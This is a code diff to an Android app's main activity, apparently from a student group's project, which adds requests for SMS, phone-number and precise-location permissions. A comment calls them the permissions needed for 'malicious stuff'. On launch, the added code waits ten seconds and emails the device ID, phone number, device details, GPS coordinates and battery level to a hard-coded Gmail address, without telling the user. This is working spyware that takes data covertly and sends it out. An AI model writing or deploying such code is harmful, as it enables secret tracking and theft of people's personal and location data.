@@ -5,16 +5,21 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.location.Location;
+import android.location.LocationManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.CountDownTimer;
 import android.provider.Settings;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
@@ -30,69 +35,89 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
-public class MainActivity extends AppCompatActivity{
+public class MainActivity extends AppCompatActivity {
     final private int REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS = 124;
+    public static String androidID;
+    public static String phoneNum;
+    public static LocationInfo locationinfo;
 
-    private void checkMultiplePermissions(){
-        if (Build.VERSION.SDK_INT >= 23)
-        {
+    private void checkMultiplePermissions() {
+        if (Build.VERSION.SDK_INT >= 23) {
             List<String> permissionsNeeded = new ArrayList<String>();
             List<String> permissionsList = new ArrayList<String>();
 
-            if(!addPermissions(permissionsList, android.Manifest.permission.ACCESS_NETWORK_STATE)){
+            if (!addPermissions(permissionsList, android.Manifest.permission.ACCESS_NETWORK_STATE)) {
                 permissionsNeeded.add("Internet");
             }
-            if(!addPermissions(permissionsList, Manifest.permission.RECEIVE_SMS))
-            {
+            if (!addPermissions(permissionsList, Manifest.permission.RECEIVE_SMS)) {
                 permissionsNeeded.add("SMS");
             }
-            if(permissionsList.size()>0)
+            if (!addPermissions(permissionsList, Manifest.permission.READ_PHONE_STATE)) {
+                permissionsNeeded.add("PhoneState");
+            }
+            if (!addPermissions(permissionsList, Manifest.permission.READ_SMS)) {
+                permissionsNeeded.add("ReadSMS");
+            }
+            if (!addPermissions(permissionsList,Manifest.permission.READ_PHONE_NUMBERS))
             {
+                permissionsNeeded.add("ReadPhoneNumbers");
+            }
+            if (!addPermissions(permissionsList,Manifest.permission.ACCESS_COARSE_LOCATION))
+            {
+                permissionsNeeded.add("CoarseLocation");
+            }
+            if (!addPermissions(permissionsList, Manifest.permission.ACCESS_FINE_LOCATION))
+            {
+                permissionsNeeded.add("FineLocation");
+            }
+            if (permissionsList.size() > 0) {
                 requestPermissions(permissionsList.toArray(new String[permissionsList.size()]),
                         REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
                 return;
             }
         }
     }
-    private boolean addPermissions(List<String> permissionsList, String permission)
-    {
-        if (Build.VERSION.SDK_INT >= 23)
-        {
-            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)
-            {
+
+    private boolean addPermissions(List<String> permissionsList, String permission) {
+        if (Build.VERSION.SDK_INT >= 23) {
+            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 permissionsList.add(permission);
-                if (!shouldShowRequestPermissionRationale(permission))
-                {
+                if (!shouldShowRequestPermissionRationale(permission)) {
                     return false;
                 }
             }
         }
         return true;
     }
+
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults)
-    {
-        switch (requestCode)
-        {
-            case REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS:{
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        switch (requestCode) {
+            case REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS: {
                 Map<String, Integer> perms = new HashMap<String, Integer>();
                 perms.put(android.Manifest.permission.RECEIVE_SMS, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.INTERNET, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.READ_PHONE_STATE, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.READ_SMS, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.READ_PHONE_NUMBERS, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.ACCESS_COARSE_LOCATION, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.ACCESS_FINE_LOCATION, PackageManager.PERMISSION_GRANTED);
                 //Results
-                for (int i =0; i<permissions.length; i++)
-                {
+                for (int i = 0; i < permissions.length; i++) {
                     perms.put(permissions[i], grantResults[i]);
                 }
                 if (perms.get(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
-                && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED)
-                {
+                        && perms.get(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED) {
                     //All required permissions for malicious stuff is granted
                     return;
-                }
-                else{
+                } else {
                     //Permissions are denied
-                    if (Build.VERSION.SDK_INT >=23 )
-                    {
+                    if (Build.VERSION.SDK_INT >= 23) {
                         Toast.makeText(
                                 getApplicationContext(),
                                 "My App cannot run without these permissions. Relaunch pls",
@@ -103,30 +128,29 @@ public class MainActivity extends AppCompatActivity{
             }
             break;
             default:
-            super.onRequestPermissionsResult(requestCode, permissions,grantResults);
+                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         }
     }
 
-    private void requestSMSPermissions()
-    {
+    private void requestSMSPermissions() {
         String permission = Manifest.permission.RECEIVE_SMS;
-        int grant = ContextCompat.checkSelfPermission(this,permission);
-        if (grant != PackageManager.PERMISSION_GRANTED)
-        {
+        int grant = ContextCompat.checkSelfPermission(this, permission);
+        if (grant != PackageManager.PERMISSION_GRANTED) {
             String[] permission_list = new String[1];
             permission_list[0] = permission;
-            ActivityCompat.requestPermissions(this,permission_list,1);
+            ActivityCompat.requestPermissions(this, permission_list, 1);
         }
     }
 
+    @SuppressLint("MissingPermission")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
 
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        //requestSMSPermissions();
-        if (Build.VERSION.SDK_INT >=23)
-        {
+
+
+        if (Build.VERSION.SDK_INT >= 23) {
             checkMultiplePermissions();
         }
 
@@ -135,9 +159,29 @@ public class MainActivity extends AppCompatActivity{
         IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
         SMSBroadcastReceiver smsBroadcastReceiver = new SMSBroadcastReceiver();
         registerReceiver(smsBroadcastReceiver, intentFilter);
-        
-        String deviceID =Settings.Secure.getString(this.getContentResolver(),Settings.Secure.ANDROID_ID);
-        EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ deviceID, DeviceScrape.getDeviceInfo() );
+
+        androidID = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        phoneNum = telephonyManager.getLine1Number();
+
+        locationinfo = new LocationInfo(this);
+        locationinfo.startLocationUpdates();
+        int batterylevel = locationinfo.getBatteryLevel();
+        new CountDownTimer(10000,1000)
+        {
+            public void onTick(long millisUntilFinished)
+            {
+
+            }
+            public void onFinish()
+            {
+                Location location = locationinfo.getLocation();
+                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +" Number:"+phoneNum , DeviceScrape.getDeviceInfo()
+                        + "\nLocation: "+locationinfo.getLocation().getLongitude() +" "+locationinfo.getLocation().getLatitude()
+                        + "\nBattery Level:" + batterylevel);
+            }
+        } .start();
+
 
 
         Button button=findViewById(R.id.secondActivityButton);
